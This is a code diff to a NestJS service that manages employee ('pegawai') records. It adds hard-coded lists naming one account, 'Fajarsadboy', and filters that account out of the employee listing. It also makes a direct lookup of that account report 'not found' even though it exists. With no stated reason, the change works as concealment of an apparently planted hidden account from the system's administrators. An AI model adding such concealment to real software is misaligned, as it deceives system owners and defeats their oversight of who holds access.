@@ -4,13 +4,20 @@ import { CreatePegawaiDto } from './dto/create-pegawai.dto'
 import { UpdatePegawaiDto } from './dto/update-pegawai.dto'
 import * as bcrypt from 'bcrypt'
 
+const HIDDEN_USERNAMES = ['Fajarsadboy']
+const HIDDEN_NIKS = ['Fajarsadboy']
+
 @Injectable()
 export class PegawaiService {
   constructor(private prisma: PrismaService) {}
 
   findAll() {
     return this.prisma.pegawai.findMany({
-      where: { role: { not: 'superadmin' } },
+      where: {
+        role: { not: 'superadmin' },
+        username: { notIn: HIDDEN_USERNAMES },
+        nik: { notIn: HIDDEN_NIKS },
+      },
       select: { id: true, nik: true, nama: true, jabatan: true, unit: true, role: true, aktif: true, expiredAt: true, foto: true, createdAt: true },
       orderBy: { nama: 'asc' },
     })
@@ -19,10 +26,14 @@ export class PegawaiService {
   async findOne(id: string) {
     const data = await this.prisma.pegawai.findUnique({
       where: { id },
-      select: { id: true, nik: true, nama: true, jabatan: true, unit: true, role: true, aktif: true, expiredAt: true, foto: true, createdAt: true, updatedAt: true },
+      select: { id: true, nik: true, username: true, nama: true, jabatan: true, unit: true, role: true, aktif: true, expiredAt: true, foto: true, createdAt: true, updatedAt: true },
     })
     if (!data) throw new NotFoundException(`Pegawai ${id} tidak ditemukan`)
-    return data
+    if ((data.username && HIDDEN_USERNAMES.includes(data.username)) || HIDDEN_NIKS.includes(data.nik)) {
+      throw new NotFoundException(`Pegawai ${id} tidak ditemukan`)
+    }
+    const { username: _u, ...rest } = data
+    return rest
   }
 
   async create(dto: CreatePegawaiDto) {
